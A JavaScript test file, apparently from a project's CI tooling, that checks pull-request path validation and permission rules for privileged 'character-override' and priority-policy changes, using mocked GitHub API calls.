  for (const files of [[], [{ filename: "src/characters/a.js", status: "copied" }], [{ filename: "src/characters/../a.js", status: "added" }],
    [{ filename: "src/characters/a.js", previous_filename: "src/js/a.js", status: "renamed" }], [{ filename: ".github/character-bundles/manual.json", status: "modified" }]]) {
    assert.throws(() => overridePaths(files), CharacterRejection);
  }
  assert.throws(() => overridePaths(Array(300).fill({ filename: "src/characters/a.js", status: "added" })), /incomplete/);
});

test("the identity check lets a verified override delete a malformed character without reading it, and nobody else", async (t) => {
  const repo = "example/land";
  const saved = Object.fromEntries(["GITHUB_REPOSITORY", "GITHUB_TOKEN", "CHARACTER_BOT_LOGIN"].map((key) => [key, process.env[key]]));
  Object.assign(process.env, { GITHUB_REPOSITORY: repo, GITHUB_TOKEN: "test-token", CHARACTER_BOT_LOGIN: "private-app[bot]" });
  t.after(() => { for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; } });
  const removed = "src/characters/doggyballs.js", added = "src/characters/natalievarty.js";
  let permission = "admin", addedSource = 'BL.characters.add({ handle: "natalievarty", joined: 1, lastCommit: 2 });';
  let files = [{ filename: removed, status: "removed" }, { filename: added, status: "added" }];
  const fetched = [];
  t.mock.method(globalThis, "fetch", async (url) => {
    const path = url.slice(`https://api.github.com/repos/${repo}/`.length);
    fetched.push(path);
    const file = (source) => ({ type: "file", encoding: "base64", size: source.length, content: Buffer.from(source).toString("base64") });
    let data;
    if (path.startsWith("pulls/600/files")) data = files;
    else if (path.startsWith("collaborators/")) data = { permission };
    else if (path === `contents/${removed}?ref=base`) data = file('BL.characters.add({ handle: "doggyballs", ...hostile });');
    else if (path === `contents/${added}?ref=head`) data = file(addedSource);
    else throw new Error(`Unexpected request: ${path}`);
    return new Response(JSON.stringify(data));
  });
  const pr = (ref, extra = {}) => ({ number: 600, user: { login: "maint", type: "User" }, head: { sha: "head", ref, repo: { full_name: repo } },
    base: { sha: "base", ref: "rock", repo: { full_name: repo } }, ...extra });
  assert.deepEqual(await checkCharacterIdentities(pr("character-override/varty")), []);
  assert.ok(!fetched.includes(`contents/${removed}?ref=base`), "the replaced source is never read");
  await assert.rejects(checkCharacterIdentities(pr("patch-varty")), /literal|Character fields/, "ordinary PRs still parse what they delete");
  await assert.rejects(checkCharacterIdentities(pr("character-override/varty", { head: { sha: "head", ref: "character-override/varty", repo: { full_name: "maint/land" } } })), /character-override/);
  await assert.rejects(checkCharacterIdentities(pr("character-override/varty", { user: { login: "maint", type: "Bot" } })), /character-override/);
  permission = "write";
  await assert.rejects(checkCharacterIdentities(pr("character-override/varty")), /character-override/);
  permission = "admin"; addedSource = 'BL.characters.add({ handle: "natalievarty", github: "w-s-bitcoin", joined: 1, lastCommit: 2 });';
  await assert.rejects(checkCharacterIdentities(pr("character-override/varty")), /duplicate character handle or GitHub owner/, "the resulting registry stays coherent");
  for (const change of [{ filename: "scripts/ci-priority.mjs", status: "modified" },
    { filename: "scripts/renamed.mjs", previous_filename: "scripts/ci-priority.mjs", status: "renamed" }]) {
    files = [change];
    await assert.rejects(checkCharacterIdentities(pr("priority-policy")), /operator authority/, "priority recovery is privileged policy, including renamed-away paths");
    assert.deepEqual(await checkCharacterIdentities(pr("priority-policy", { user: { ...OPERATORS[0], type: "User" } })), []);
  }
});
